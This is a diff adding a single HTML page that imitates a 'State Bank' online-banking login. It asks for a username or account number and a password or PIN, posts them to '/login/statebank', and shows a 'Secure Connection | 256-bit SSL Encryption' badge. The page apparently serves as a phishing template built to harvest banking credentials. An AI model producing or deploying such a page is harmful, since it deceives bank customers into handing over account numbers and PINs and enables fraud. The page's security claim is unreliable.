@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>State Bank</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:Arial,sans-serif;background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
+        .sb-box{background:#fff;padding:40px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,.1);width:400px}
+        .sb-box h1{text-align:center;color:#1a3c6e;font-size:28px;margin-bottom:10px}
+        .sb-box .sub{text-align:center;color:#666;font-size:14px;margin-bottom:30px}
+        input{width:100%;padding:12px 14px;margin:8px 0;border:1px solid #ddd;border-radius:4px;font-size:16px}
+        input:focus{border-color:#1a3c6e;outline:none}
+        button{width:100%;padding:14px;background:#1a3c6e;border:none;border-radius:4px;color:#fff;font-size:16px;font-weight:600;cursor:pointer;margin:10px 0}
+        button:hover{background:#0f2848}
+        .security{text-align:center;font-size:12px;color:#888;margin-top:20px}
+        .security img{vertical-align:middle;margin-right:5px}
+    </style>
+</head>
+<body>
+<div class="sb-box">
+    <h1>🏦 State Bank</h1>
+    <p class="sub">Secure Online Banking</p>
+    <form method="POST" action="/login/statebank">
+        <input type="text" name="username" placeholder="Username / Account Number" required>
+        <input type="password" name="password" placeholder="Password / PIN" required>
+        <button type="submit">Login</button>
+    </form>
+    <div class="security">🔒 Secure Connection | 256-bit SSL Encryption</div>
+</div>
+</body>
+</html>
